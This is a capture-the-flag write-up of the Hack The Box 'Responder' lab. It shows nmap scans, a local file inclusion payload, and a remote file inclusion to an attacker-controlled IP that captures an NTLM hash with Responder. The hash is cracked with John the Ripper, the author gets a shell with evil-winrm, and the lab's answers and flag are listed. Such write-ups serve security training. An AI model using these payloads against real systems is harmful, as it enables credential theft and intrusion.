# Responder (Tier 1)

## <mark style="color:blue;">Description</mark>

* **Tier&#x20;**<mark style="color:green;">**->**</mark>**&#x20;1**
* **Difficult** <mark style="color:green;">**->**</mark> Very Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **Tags&#x20;**<mark style="color:green;">**->**</mark> WinRM / Custom Applications / Protocols / XAMPP / SMB / Responder / PHP\
  &#x20;            / Reconnaissance / Password Cracking / Hash Capture / Remote File Inclusion\
  &#x20;            / Remote Code Execution

<figure><img src="../../.gitbook/assets/image (120) (1).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=1</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started doing an initial scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)

<pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>nmap -p- -Pn --min-rate 2000 10.129.215.213
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (138) (1).png" alt=""><figcaption></figcaption></figure>

***

* Then I did an exhaustive scan to get more information about the service running on the open port

<pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>nmap -p80 -sVC 10.129.215.213
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (140) (1).png" alt=""><figcaption></figcaption></figure>

***

* I found the HTTP protocol running on port 80, so I went to the browser to check the content being deployed. Hitting the site using the IP redirected me to a domain named _unika.htb,_ but I was unable to reach the server

<figure><img src="../../.gitbook/assets/image (139) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
{% endhint %}

***

* With this, I answered the first question

<figure><img src="../../.gitbook/assets/image (141) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**unika.htb**_

***

* The reason why the page didn't show me content was that it wasn't on my list of known hosts. To fix this, I added it by modifying the _/etc/hosts_ file, relating the IP to the _unika.htb_ domain. After that, I hit the site again, and it worked properly

{% code lineNumbers="true" %}
```bash
sudo nano /etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (142) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (143) (1).png" alt=""><figcaption></figcaption></figure>

***

* Once there, I found a dashboard page for a business with some buttons that didn't work. Exploring the page, I didn't find anything relevant, so I used the [_Wappalyzer_](../../web-exploitation/tools-and-utilities.md#wappalyzer) extension to get some extra information about the technologies of the site

<figure><img src="../../.gitbook/assets/image (146) (1).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (147) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**php**_

***

* Navigating to the top right corner, I found a slider to select the language of the page, which caught my attention. When I selected a different language from _english_, the language of the whole page changed, and the URL showed a query reflecting this action

<figure><img src="../../.gitbook/assets/image (144) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (145) (1).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (148) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**page**_



***

* To test if this query could be vulnerable to a Local File Inclusion attack, I tried listing the contents of the _/etc/hosts_ file by changing the value of the _page_ parameter. After some tries, I found a successful payload and displayed the content of the requested file

{% code title="Payload" lineNumbers="true" %}
```url
page=../../../../../../../../windows/system32/drivers/etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (151) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about Local File Inclusion and its exploitation, you can go [here](../../web-exploitation/broken-access-control/local-file-inclusion.md)
{% endhint %}

***

* With this and a little research, I answered some questions

<figure><img src="../../.gitbook/assets/image (152) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: ../../../../../../../../windows/system32/drivers/etc/hosts

***

<figure><img src="../../.gitbook/assets/image (153) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**//10.10.14.6/somefile**_

***

<figure><img src="../../.gitbook/assets/image (154) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**New Technology Lan Manager**_

***

<figure><img src="../../.gitbook/assets/image (155) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**-I**_

***

<figure><img src="../../.gitbook/assets/image (156) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**John The Ripper**_

***

* Knowing that I could abuse this, I tried using the [_Responder_](../../networks/tools-and-utilities.md#responder) utility to intercept the communication between the web server and the local system. That was to try to catch the credentials for the internal SMB service, based on the fact that it was a Windows system and could be running it. I started configuring the tool, so I modified the _Responder.config_ file to set the value _SMB_ to _On_

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nano /usr/share/responder/Responder.conf
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (160) (1).png" alt=""><figcaption></figcaption></figure>

***

* After that, I initialized the tool specifying the network interface I wanted to use, in this case, the _tun0_ interface

<figure><img src="../../.gitbook/assets/image (161) (1).png" alt=""><figcaption><p>Snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (162) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
We can check the interface using the`ifconfig` command. Normally, the _tun0_ interface is the one related to the connection with a VPN
{% endhint %}

***

* Then I went to the vulnerable endpoint again to modify the URL and tried to do a Remote File Inclusion to my machine, to connect to the _Responder_ server I had deployed. With this action, the page displayed an error, but when checking the terminal, _Responder_ had caught the credentials of the target

{% code title="Payload" overflow="wrap" lineNumbers="true" %}
```url
page=//10.10.14.195/somefile
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (163) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (164) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about Remote File Inclusion and its exploitation, you can go [here](../../web-exploitation/broken-access-control/remote-file-inclusion.md)
{% endhint %}

***

* I caught the communication from the _Administrator_ user and the corresponding hash, so I saved it in a text file. I could try to break the hash using the [_John the Ripper_](../../cryptography/tools-and-utilities.md#john-the-ripper) tool and the well-known _rockyou.txt_ dictionary. After running it, I observed the cracking process was successful, obtaining the password _badminton_ for the user _Administrator_

{% code overflow="wrap" lineNumbers="true" %}
```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (166) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (165) (1).png" alt=""><figcaption></figcaption></figure>

***

* With this and a little research, I answered the next questions

<figure><img src="../../.gitbook/assets/image (159) (1).png" alt=""><figcaption></figcaption></figure>

> Answer:  _**badminton**_

***

<figure><img src="../../.gitbook/assets/image (157) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**5985**_

***

* Having these credentials, I could try to connect to the system directly. For this purpose, I used the _evil-winrm_ tool to try to get a shell, and it worked successfully

<figure><img src="../../.gitbook/assets/image (167) (1).png" alt=""><figcaption></figcaption></figure>

***

* Searching through the system, I found a file called _flag.txt_ in the _C:\Users\mike\Desktop_ folder. Finally, I checked the content of the _flag.txt_ file, retrieving the flag

<figure><img src="../../.gitbook/assets/image (168) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (169) (1).png" alt=""><figcaption></figcaption></figure>

***

* With this, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (133) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**ea81b7afddd03efaa0945333ed147fac**_
